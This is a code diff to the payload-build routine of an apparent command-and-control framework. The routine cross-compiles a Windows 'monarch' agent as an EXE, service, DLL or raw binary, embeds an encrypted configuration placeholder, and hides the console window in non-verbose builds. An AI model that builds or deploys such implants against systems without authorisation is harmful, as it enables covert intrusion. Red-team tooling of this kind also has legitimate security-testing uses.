@@ -1,4 +1,4 @@
-import terminal, strformat, strutils, sequtils, tables, system, osproc, streams
+import terminal, strformat, strutils, tables, system, osproc, streams
 
 import ../globals
 import ../core/[logger, websocket]
@@ -68,40 +68,47 @@ proc serializeConfiguration(cq: Conquest, agentBuildInformation: AgentBuildInfor
     cq.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.", clientId = clientId)
 
     return encMaterial & encData 
-
-proc replaceAfterPrefix(content, prefix, value: string, quoted: bool = false): string = 
-    result = content.splitLines().mapIt(
-        if it.startsWith(prefix):
-            if quoted: prefix & '"' & value & '"' 
-            else: prefix & value
-        else: 
-            it
-    ).join("\n")
     
 proc compile(cq: Conquest, placeholderLength: int, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): string = 
     
     # Build payload name 
     let listenerType = ($listener.listenerType).toLowerAscii()
     let arch = "x64"
-    let ext = case agentBuildInformation.payloadType
-    of EXE: "exe"
-    of SVC: "svc.exe"
-    of DLL: "dll"
-    of BIN: "bin"
+
+    var ext: string = ""
+    var additionalFlags: string = ""
+
+    case agentBuildInformation.payloadType
+    of EXE: ext = "exe"
+    of SVC: ext = "svc.exe"
+    of DLL:
+        ext = "dll"
+        additionalFlags = """
+--app:lib
+--nomain"""
+    of BIN: ext = "bin"
 
     let configFile = fmt"{CONQUEST_ROOT}/src/agents/monarch/nim.cfg"  
-    let exeFile = fmt"{CONQUEST_ROOT}/bin/monarch.{listenerType}_{arch}.{ext}" 
+    let outFile = fmt"{CONQUEST_ROOT}/bin/monarch.{listenerType}_{arch}.{ext}" 
 
-    let buildCommand = fmt"nim --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -o:{exeFile} c {CONQUEST_ROOT}/src/agents/monarch/main.nim"
+    let buildCommand = fmt"nim --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -o:{outFile} c {CONQUEST_ROOT}/src/agents/monarch/main.nim"
 
-    # Update placeholder and configuration values 
+    # Create agent configuration file (nim.cfg)  
     let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))
-    var config = readFile(configFile)
-                    .replaceAfterPrefix("-d:CONFIGURATION=", placeholder, quoted = true)    
-                    .replaceAfterPrefix("-d:MODULES=", $agentBuildInformation.modules)
-                    .replaceAfterPrefix("-d:VERBOSE=", $agentBuildInformation.verbose)
-                    .replaceAfterPrefix("-d:TRANSPORT_", $(listener.listenerType))
-                    .replaceAfterPrefix("-d:PAYLOAD_", $(agentBuildInformation.payloadType))
+    let hideConsole = if not agentBuildInformation.verbose: ",-subsystem,windows" else: ""
+    var config = fmt"""# Compiler flags
+-d:agent
+-d:release
+--opt:size
+--l:"-Wl,-s{hideConsole}"
+{additionalFlags}
+# Monarch agent configuration
+-d:CONFIGURATION="{placeholder}"
+-d:MODULES={$agentBuildInformation.modules}
+-d:VERBOSE={$agentBuildInformation.verbose}
+-d:TRANSPORT_{$(listener.listenerType)}
+-d:PAYLOAD_{$(agentBuildInformation.payloadType)}"""
+
     writeFile(configFile, config)
 
     cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
@@ -126,7 +133,7 @@ proc compile(cq: Conquest, placeholderLength: int, agentBuildInformation: AgentB
         if exitCode == 0:
             cq.info("Agent payload generated successfully.")
             cq.sendBuildlogItem(LOG_INFO_SHORT, "Agent payload generated successfully.", clientId = clientId)
-            return exeFile
+            return outFile
         else:
             cq.error("Build script exited with code ", $exitCode)
             cq.sendBuildlogItem(LOG_ERROR_SHORT, "Build script exited with code " & $exitCode, clientId = clientId)
